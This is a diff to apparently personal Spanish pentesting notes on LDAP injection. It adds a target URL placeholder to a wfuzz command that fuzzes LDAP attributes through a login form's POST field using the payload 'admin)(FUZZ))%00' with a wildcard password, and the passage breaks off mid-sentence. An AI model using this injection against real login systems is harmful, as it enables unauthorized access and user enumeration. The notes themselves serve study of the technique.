@@ -14,6 +14,7 @@ Nos dará información sobre el servicio aportándonos el `dc`, *LDAP* tiene un 
 Para hacer fuerza bruta para la enumeración de usuarios, primero habría que hacer un descubrimiento de atributos.
 Para eso usaremos [[WFUZZ]]
 
-`wfuzz -c -w /home/jalag/Workzone/Herramientas/Wordlists/Seclist/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ))%00&password=*&login=1&submit=Submit'`
+`wfuzz -c -w /home/jalag/Workzone/Herramientas/Wordlists/Seclist/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ))%00&password=*&login=1&submit=Submit' http://<IP_Victima>` 
 ###### Desde la parte de 'user_id ....' Es el dato enviado por POST en BurpSuite
 
+Una vez obtenido por ejemplo el atributo de 
